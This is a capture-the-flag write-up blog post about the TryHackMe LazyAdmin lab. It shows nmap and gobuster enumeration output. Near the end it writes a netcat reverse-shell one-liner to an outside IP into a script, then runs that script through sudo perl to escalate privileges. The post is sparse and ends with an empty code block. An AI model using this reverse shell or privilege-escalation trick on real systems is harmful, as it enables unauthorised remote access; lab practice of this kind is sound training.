---
layout: single
title:  "Lazy Admin - TryHackMe"
date:   2021-04-03 04:00:00 -0400
classes: wide
categories: THM
tags:
 - Privesc
---

This time i'll be working with [LazyAdmin](https://www.tryhackme.com/room/lazyadmin) room from **TryHackMe**. This is a free lab with low difficulty.

## Lab info

![Lab Info](/images/THM/LazyAdmin/00-lab-info.png "Machine Info"){: .align-center}


## Task 1 - Lazy Admin


### Enumeration

```bash
nmap -sC -sV -p22,80 -oN ports.nmap -oX ports.xml 10.10.117.5

Nmap scan report for 10.10.117.5
Host is up (0.33s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```




```bash
gobuster dir -u http://10.10.117.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300 --no-error
```
```go
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.117.5
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/03 16:26:51 Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 312] [--> http://10.10.117.5/content/]
/server-status        (Status: 403) [Size: 276]

===============================================================
2021/04/03 16:35:09 Finished
===============================================================
```

```bash
gobuster dir -u http://10.10.117.5/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300 --no-error
```
```go
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.117.5/content
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/03 17:04:23 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> http://10.10.117.5/content/images/]
/js                   (Status: 301) [Size: 315] [--> http://10.10.117.5/content/js/]
/inc                  (Status: 301) [Size: 316] [--> http://10.10.117.5/content/inc/]
/as                   (Status: 301) [Size: 315] [--> http://10.10.117.5/content/as/]
/_themes              (Status: 301) [Size: 320] [--> http://10.10.117.5/content/_themes/]
/attachment           (Status: 301) [Size: 323] [--> http://10.10.117.5/content/attachment/]

===============================================================
2021/04/03 17:12:36 Finished
===============================================================
```

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.0.103 5554 >/tmp/f" > /etc/copy.sh
```

```
sudo /usr/bin/perl /home/itguy/backup.pl
```


```
```

